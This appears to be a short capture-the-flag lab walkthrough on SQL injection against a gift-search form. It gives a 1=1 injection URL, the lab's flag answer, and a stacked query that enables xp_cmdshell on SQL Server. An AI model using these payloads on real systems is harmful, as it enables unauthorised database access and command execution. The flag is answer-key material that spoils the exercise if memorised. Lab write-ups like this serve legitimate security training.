



Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?

```

```

Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?

```
ODBC Driver 17 for SQL Server
```

Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?

```
http://10.10.160.15/giftresults.php?age=teenager%27%20or%201=1--&interests=toys&budget=10

THM{a4ffc901c27fb89efe3c31642ece4447}
```


- Habilitar xp_cmd
```
http://10.10.160.15/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```


